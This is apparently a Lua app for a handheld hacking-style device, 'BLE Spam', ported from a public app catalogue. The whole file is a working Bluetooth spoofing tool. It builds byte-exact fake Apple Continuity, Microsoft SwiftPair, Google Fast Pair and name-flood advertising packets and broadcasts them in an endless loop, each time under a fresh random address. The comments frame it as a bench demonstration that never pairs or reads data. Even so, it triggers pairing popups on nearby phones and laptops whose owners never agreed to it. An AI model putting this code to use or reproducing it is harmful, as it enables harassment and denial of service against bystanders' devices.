-- BLE Spam (#89) - the noise the advertising channel will carry, made visible.
--
-- The stock MeowKit firmware ships this app, ported from the public
-- Momentum-Apps catalogue, and catnip carries it for the same reason it carries
-- the others: it is the firmware the hardware was sold running. What it does is
-- show how trusting the 2.4 GHz advertising channel is - it cycles the same
-- spoofed adverts a phone or a laptop reads as "a device is nearby", so a room
-- full of them lights up with pairing popups that answer to nothing. It is a
-- demonstration: a maker on their own bench, a talk, a check of whether a fleet
-- is susceptible. Its whole point is to be legible while it does it.
--
-- The frame it stays inside, on purpose:
--   * Public catalogue only. Every payload family here is one the stock app
--     ported - Apple Continuity, Microsoft SwiftPair, Google Fast Pair,
--     NameFlood. Nothing new is invented; there would be no point.
--   * Advertising, and nothing downstream of it. These are non-connectable or
--     at most connectable adverts. Nothing pairs, connects, or reads anything
--     back. It is noise on the channel and that is the whole of it.
--   * A stop that means it. B leaves the app, and leaving takes the radio down
--     (the platform's own invariant, the same one that ends the beacon and the
--     mouse). Nothing advertises in the background; the app does nothing until
--     it is launched again.
--
-- What is testable off the radio - the families' byte layouts and the cycle
-- that walks them - is exposed on the `blespam` global so a host test drives
-- these very functions rather than a copy that could agree with a wrong app.

-- ---- entropy ---------------------------------------------------------------
--
-- The catalogue randomises the fields a real device would fill in - a battery
-- level, an auth tag, an encrypted blob - so each advert looks like a fresh
-- one. Kept as an argument to the builders rather than reached for inside them,
-- so the layout is a pure function of its inputs and a test can pin every byte.
local function rbytes(n)
  local t = {}
  for i = 1, n do t[i] = math.random(0, 255) end
  return string.char(table.unpack(t))
end

blespam = {}

-- ---- the payload families --------------------------------------------------
--
-- Each returns the finished advertising data - the AD structures concatenated,
-- length and type bytes and all - laid out exactly as the public catalogue
-- builds them. The variable fields (a model id, an action, a name) are
-- arguments; the fixed catalogue constants (the company id, the frame type, the
-- lengths) are here.

-- Apple Continuity, Nearby Action: the "device popup" - "Setup New iPhone",
-- "Join This AppleTV?". Manufacturer-specific AD under Apple's 0x004C, type
-- 0x0F, then an action flags byte, the action, and a 3-byte auth tag.
function blespam.apple_action(action, flags, tag3)
  return string.char(0x0A, 0xFF, 0x4C, 0x00, 0x0F, 0x05, flags, action) .. tag3
end

-- Apple Continuity, Proximity Pair: the AirPods-style pairing card. Type 0x07,
-- a prefix, the 2-byte model (big-endian), a fixed 0x55 status, three
-- battery/lid bytes, the colour, a reserved 0x00, and a 16-byte encrypted blob.
function blespam.apple_pair(model, color, prefix, rnd19)
  return string.char(0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19,
                     prefix, (model >> 8) & 0xFF, model & 0xFF, 0x55)
      .. rnd19:sub(1, 3)                  -- buds battery, case, lid counter
      .. string.char(color, 0x00)
      .. rnd19:sub(4, 19)                 -- encrypted payload
end

-- Microsoft SwiftPair: the Windows "new device found" toast. Manufacturer AD
-- under Microsoft's 0x0006, beacon id 0x03, sub-scenario 0x00, a reserved RSSI
-- byte, then the device name shown in the toast. Connectable, because the toast
-- offers to pair.
function blespam.swiftpair(name)
  return string.char(6 + #name, 0xFF, 0x06, 0x00, 0x03, 0x00, 0x80) .. name
end

-- Google/Android Fast Pair: the half-sheet that names a headset. The Fast Pair
-- service UUID 0xFE2C in a UUID-list AD and again in a service-data AD, the
-- 3-byte model id (big-endian), then a Tx-power AD. Connectable.
function blespam.fastpair(model, tx)
  return string.char(0x03, 0x03, 0x2C, 0xFE,
                     0x06, 0x16, 0x2C, 0xFE,
                     (model >> 16) & 0xFF, (model >> 8) & 0xFF, model & 0xFF,
                     0x02, 0x0A, tx & 0xFF)
end

-- NameFlood: floods the scanner list with a device name. Flags AD, a
-- complete-local-name AD carrying the name, a HID service-UUID AD (0x1812), and
-- a Tx-power AD.
function blespam.nameflood(name)
  return string.char(0x02, 0x01, 0x06, #name + 1, 0x09) .. name
      .. string.char(0x03, 0x02, 0x12, 0x18, 0x02, 0x0A, 0x00)
end

-- ---- the catalogue this app cycles -----------------------------------------
--
-- A subset of each family's public value lists - enough for a stream of
-- distinct-looking adverts without carrying the whole table on the device.
local ACTIONS = { 0x20, 0x09, 0x27, 0x13, 0x24, 0x05, 0x01, 0x06, 0x0B }
local PAIR_MODELS = { 0x0E20, 0x0A20, 0x0220, 0x0F20, 0x1320, 0x1420, 0x1020, 0x0C20 }
local FASTPAIR_MODELS = { 0x0602F0, 0x0603F0, 0x03AA91, 0x03C95C, 0x06D8FC, 0x060000 }
-- Short enough that the longest advert stays inside the 31-byte cap.
local NAMES = { "AirPods", "TV", "Buds", "Speaker", "Watch", "Mouse", "Keyboard" }

local function pick(t) return t[math.random(#t)] end

-- Each family knows its own name (for the screen), whether it needs a
-- connectable advert, and how to build one randomised payload on demand.
blespam.families = {
  { name = "Apple Continuity", connectable = true,
    build = function() return blespam.apple_action(pick(ACTIONS), 0xC0, rbytes(3)) end },
  { name = "Apple Pairing",    connectable = true,
    build = function() return blespam.apple_pair(pick(PAIR_MODELS), math.random(0, 255),
                                                 0x01, rbytes(19)) end },
  { name = "MS SwiftPair",     connectable = true,
    build = function() return blespam.swiftpair(pick(NAMES)) end },
  { name = "Google Fast Pair", connectable = true,
    build = function() return blespam.fastpair(pick(FASTPAIR_MODELS), math.random(0, 255)) end },
  { name = "Name Flood",       connectable = false,
    build = function() return blespam.nameflood(pick(NAMES)) end },
}

-- ---- the cycle -------------------------------------------------------------
--
-- A cursor over the families. tick() advances one step and wraps, so the app
-- walks the catalogue for ever; stop() halts it, after which tick() does
-- nothing. Kept as plain state on the global so a host test can walk it without
-- a radio - the same split the beacon app makes for its payloads.
blespam.cursor = { i = 0, running = true }

function blespam.reset()
  blespam.cursor.i = 0
  blespam.cursor.running = true
end

function blespam.stop()
  blespam.cursor.running = false
end

function blespam.tick()
  if not blespam.cursor.running then return nil end
  blespam.cursor.i = blespam.cursor.i % #blespam.families + 1
  return blespam.families[blespam.cursor.i]
end

-- How fast one spoofed advert repeats on the air, and how long a family holds
-- the channel before the next takes it - long enough to read the name.
blespam.interval_ms = 100
blespam.dwell_ms = 900

-- Put one family on the air: a fresh random address first, so this advert looks
-- like a new device rather than the last one changing its costume, then the
-- randomised payload under the family's adv type.
function blespam.broadcast(fam)
  device.beacon.address()
  device.beacon.start{ payload = fam.build(),
                       interval_ms = blespam.interval_ms,
                       connectable = fam.connectable }
end

-- ---- the app ---------------------------------------------------------------

local title = ui.label{ id = "title", align = "center", style = "title", text = "BLE Spam" }
local doing = ui.label{ id = "doing", align = "center", style = "caption",
                        text = "spoofing nearby-device adverts" }
local family = ui.label{ id = "family", align = "center", style = "display", text = "" }
local hint = ui.label{ id = "hint", align = "center", style = "caption",
                       text = "B stops and clears the air" }
ui.screen{ title, doing, family, hint }

-- The loop: advance the cursor, broadcast that family, name it on screen, hold
-- for the dwell, repeat. sys.sleep yields to the scheduler so the watchdog is
-- fed and B is still heard - and B, leaving the app, is what takes the radio
-- down. There is no on_back and no explicit stop here: a peripheral surface
-- that outlived its app is exactly the hazard the platform's teardown invariant
-- exists to close, and it closes it for this app the same way it does the
-- beacon's.
math.randomseed(sys.now())
while true do
  local fam = blespam.tick()
  blespam.broadcast(fam)
  family.text = fam.name
  sys.sleep(blespam.dwell_ms)
end
